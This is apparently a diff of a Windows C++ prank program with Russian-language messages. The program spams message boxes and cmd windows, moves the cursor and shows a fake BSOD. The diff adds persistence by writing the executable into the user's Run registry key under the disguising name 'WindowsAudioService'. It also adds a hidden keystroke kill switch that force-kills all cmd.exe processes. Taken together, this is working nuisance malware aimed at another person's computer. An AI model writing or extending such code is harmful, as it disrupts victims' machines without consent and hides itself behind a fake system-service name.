@@ -7,10 +7,83 @@
 #include <chrono>
 #include <string>
 #include <vector>
+#include <atomic>
 
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "gdi32.lib")
+#pragma comment(lib, "advapi32.lib")
 
+static const wchar_t* kRunKey  = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+static const wchar_t* kRunName = L"WindowsAudioService";
+
+static std::atomic<bool> g_killSwitch{false};
+
+// ─────────── автозапуск ───────────
+static bool IsAutoRunInstalled() {
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, kRunKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
+        return false;
+    wchar_t buf[MAX_PATH] = {};
+    DWORD sz = sizeof(buf), type = 0;
+    LONG r = RegQueryValueExW(hKey, kRunName, nullptr, &type, (BYTE*)buf, &sz);
+    RegCloseKey(hKey);
+    return r == ERROR_SUCCESS;
+}
+
+static void InstallAutoRun() {
+    wchar_t path[MAX_PATH] = {};
+    GetModuleFileNameW(nullptr, path, MAX_PATH);
+
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, kRunKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        std::wstring quoted = L"\"" + std::wstring(path) + L"\"";
+        RegSetValueExW(hKey, kRunName, 0, REG_SZ,
+                       (const BYTE*)quoted.c_str(),
+                       (DWORD)((quoted.size() + 1) * sizeof(wchar_t)));
+        RegCloseKey(hKey);
+    }
+}
+
+static void RemoveAutoRun() {
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, kRunKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegDeleteValueW(hKey, kRunName);
+        RegCloseKey(hKey);
+    }
+}
+
+// ─────────── kill switch ───────────
+static DWORD WINAPI KillSwitchWatcher(LPVOID) {
+    int holdMs = 0;
+    const int HOLD_REQUIRED = 3000;
+    while (!g_killSwitch.load()) {
+        bool ctrl  = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
+        bool shift = (GetAsyncKeyState(VK_SHIFT)   & 0x8000) != 0;
+        bool alt   = (GetAsyncKeyState(VK_MENU)    & 0x8000) != 0;
+        bool q     = (GetAsyncKeyState('Q')        & 0x8000) != 0;
+        if (ctrl && shift && alt && q) {
+            holdMs += 50;
+            if (holdMs >= HOLD_REQUIRED) {
+                g_killSwitch.store(true);
+                RemoveAutoRun();
+                system("taskkill /F /IM cmd.exe /T > nul 2>&1");
+                MessageBoxW(nullptr,
+                    L"Kill switch сработал.\n\n"
+                    L"Прога удалена из автозагрузки.\n"
+                    L"Больше не появится.\n\n— Fox",
+                    L"Самоуничтожение",
+                    MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
+                ExitProcess(0);
+            }
+        } else {
+            holdMs = 0;
+        }
+        Sleep(50);
+    }
+    return 0;
+}
+
+// ─────────── MessageBox-спам ───────────
 static const wchar_t* kMessages[] = {
     L"даров Вась ты чё там ты там в порядке вась?",
     L"бро глаголит имбу",
@@ -28,6 +101,7 @@ static constexpr int kMsgCount = _countof(kMessages);
 static DWORD WINAPI MsgSpammer(LPVOID) {
     std::srand((unsigned)std::time(nullptr) ^ GetCurrentThreadId());
     for (int i = 0; i < 12; ++i) {
+        if (g_killSwitch.load()) return 0;
         const wchar_t* txt = kMessages[std::rand() % kMsgCount];
         std::thread([txt]() {
             MessageBoxW(nullptr, txt, L"Ой, всё",
@@ -38,49 +112,11 @@ static DWORD WINAPI MsgSpammer(LPVOID) {
     return 0;
 }
 
-// ─────────── поворот экрана ───────────
-static bool RotateScreen(DWORD orientation) {
-    DEVMODEW dm{};
-    dm.dmSize = sizeof(dm);
-    if (!EnumDisplaySettingsW(nullptr, ENUM_CURRENT_SETTINGS, &dm)) return false;
-
-    // при 90°/270° меняем ширину и высоту местами
-    if (orientation == DMDO_90 || orientation == DMDO_270) {
-        DWORD tmp = dm.dmPelsWidth;
-        dm.dmPelsWidth  = dm.dmPelsHeight;
-        dm.dmPelsHeight = tmp;
-    }
-    dm.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT | DM_DISPLAYORIENTATION;
-    dm.dmDisplayOrientation = orientation;
-
-    LONG res = ChangeDisplaySettingsExW(nullptr, &dm, nullptr,
-                                        CDS_UPDATEREGISTRY, nullptr);
-    return res == DISP_CHANGE_SUCCESSFUL;
-}
-
-static DWORD WINAPI ScreenTwister(LPVOID) {
-    std::this_thread::sleep_for(std::chrono::milliseconds(500));
-
-    // 90°
-    RotateScreen(DMDO_90);
-    std::this_thread::sleep_for(std::chrono::seconds(2));
-
-    // 180° — вот это как на фото "перевёрнутый"
-    RotateScreen(DMDO_180);
-    std::this_thread::sleep_for(std::chrono::seconds(2));
-
-    // 270°
-    RotateScreen(DMDO_270);
-    std::this_thread::sleep_for(std::chrono::seconds(2));
-
-    // назад в нормальное
-    RotateScreen(DMDO_DEFAULT);
-    return 0;
-}
-
+// ─────────── cmd-спам ───────────
 static DWORD WINAPI CmdSpammer(LPVOID) {
     std::this_thread::sleep_for(std::chrono::seconds(7));
     for (int i = 0; i < 40; ++i) {
+        if (g_killSwitch.load()) return 0;
         STARTUPINFOW si{};
         si.cb = sizeof(si);
         PROCESS_INFORMATION pi{};
@@ -117,6 +153,7 @@ static DWORD WINAPI CursorDancer(LPVOID) {
     const auto t0 = std::chrono::steady_clock::now();
     while (std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::steady_clock::now() - t0).count() < 3) {
+        if (g_killSwitch.load()) return 0;
         const double t = std::chrono::duration<double>(
             std::chrono::steady_clock::now() - t0).count();
         int x = start.x + (int)(ampX * std::sin(t * 1.1));
@@ -127,6 +164,7 @@ static DWORD WINAPI CursorDancer(LPVOID) {
     return 0;
 }
 
+// ─────────── красный BSOD ───────────
 static LRESULT CALLBACK BsodWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
     if (m == WM_ERASEBKGND) return 1;
     if (m == WM_PAINT) {
@@ -163,7 +201,7 @@ static LRESULT CALLBACK BsodWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
             L"Виновник: Sanchez\n"
             L"Сообщение: Sanchez vzlomal tvoy pk piska pi piska\n\n"
             L"Что-то пошло не так, но не переживай — это шутка.\n"
-            L"Через несколько секунд всё вернётся на круги своя.\n"
+            L"Чтобы выключить навсегда — зажми Ctrl+Shift+Alt+Q на 3 секунды.\n"
             L"— Jack & Fox";
         DrawTextW(dc, body, -1, &rt, DT_LEFT | DT_WORDBREAK);
 
@@ -172,7 +210,7 @@ static LRESULT CALLBACK BsodWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
             ANTIALIASED_QUALITY, DEFAULT_PITCH, L"Segoe UI");
         SelectObject(dc, fSmall);
         RECT rs{60, H - 80, W - 60, H - 20};
-        DrawTextW(dc, L"Шутка. Реального вреда нет. Продолжай работать.",
+        DrawTextW(dc, L"Шутка. Kill switch: Ctrl+Shift+Alt+Q.",
                   -1, &rs, DT_LEFT | DT_SINGLELINE);
 
         SelectObject(dc, old);
@@ -188,6 +226,8 @@ static LRESULT CALLBACK BsodWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
 
 static DWORD WINAPI RedBSOD(LPVOID) {
     std::this_thread::sleep_for(std::chrono::seconds(9));
+    if (g_killSwitch.load()) return 0;
+
     WNDCLASSW wc{};
     wc.lpfnWndProc   = BsodWndProc;
     wc.hInstance     = GetModuleHandleW(nullptr);
@@ -209,14 +249,15 @@ static DWORD WINAPI RedBSOD(LPVOID) {
     return 0;
 }
 
+// ─────────── финал ───────────
 static DWORD WINAPI FinalWord(LPVOID) {
     std::this_thread::sleep_for(std::chrono::seconds(16));
-    // на всякий случай возвращаем экран в норму (если что-то пошло не так)
-    RotateScreen(DMDO_DEFAULT);
+    if (g_killSwitch.load()) return 0;
 
     MessageBoxW(nullptr,
-        L"Ладно, хватит.\n\nЭто была шутка. Ничего не удалено, ничего не украдено.\n"
-        L"Если экран остался повёрнутым — верни через настройки дисплея.\n\n"
+        L"Это была шутка. Ничего не удалено.\n\n"
+        L"Я остаюсь в автозагрузке и буду вылезать каждый раз.\n\n"
+        L"Чтобы выключить навсегда — зажми Ctrl+Shift+Alt+Q на 3 секунды.\n\n"
         L"— Jack & Fox",
         L"Всё, я ушёл",
         MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
@@ -230,12 +271,14 @@ int main() {
 
     if (HWND c = GetConsoleWindow()) ShowWindow(c, SW_HIDE);
 
-    CreateThread(nullptr, 0, MsgSpammer,     nullptr, 0, nullptr);
-    CreateThread(nullptr, 0, CursorDancer,   nullptr, 0, nullptr);
-    CreateThread(nullptr, 0, ScreenTwister,  nullptr, 0, nullptr);
-    CreateThread(nullptr, 0, CmdSpammer,     nullptr, 0, nullptr);
-    CreateThread(nullptr, 0, RedBSOD,        nullptr, 0, nullptr);
-    CreateThread(nullptr, 0, FinalWord,      nullptr, 0, nullptr);
+    if (!IsAutoRunInstalled()) InstallAutoRun();
+
+    CreateThread(nullptr, 0, KillSwitchWatcher, nullptr, 0, nullptr);
+    CreateThread(nullptr, 0, MsgSpammer,        nullptr, 0, nullptr);
+    CreateThread(nullptr, 0, CursorDancer,      nullptr, 0, nullptr);
+    CreateThread(nullptr, 0, CmdSpammer,        nullptr, 0, nullptr);
+    CreateThread(nullptr, 0, RedBSOD,           nullptr, 0, nullptr);
+    CreateThread(nullptr, 0, FinalWord,         nullptr, 0, nullptr);
 
     Sleep(INFINITE);
     return 0;
